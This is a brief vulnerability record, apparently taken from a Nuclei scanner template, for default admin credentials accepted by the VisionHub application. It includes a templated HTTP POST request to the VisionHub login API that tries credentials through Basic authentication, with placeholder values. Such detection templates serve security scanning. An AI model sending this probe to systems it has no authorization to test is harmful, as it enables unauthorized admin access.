# Vulnerability: VisionHub Default Login
**Classification:** CWE-522
**Source:** Nuclei Template (`visionhub-default-login.yaml`)

## Description
VisionHub application default admin credentials were accepted.

## Vulnerable Code Pattern / Exploit Payload
```http
POST /VisionHubWebApi/api/Login HTTP/1.1
Host: {{Hostname}}
Authorization: Basic {{base64(username + ':' + password)}}
```

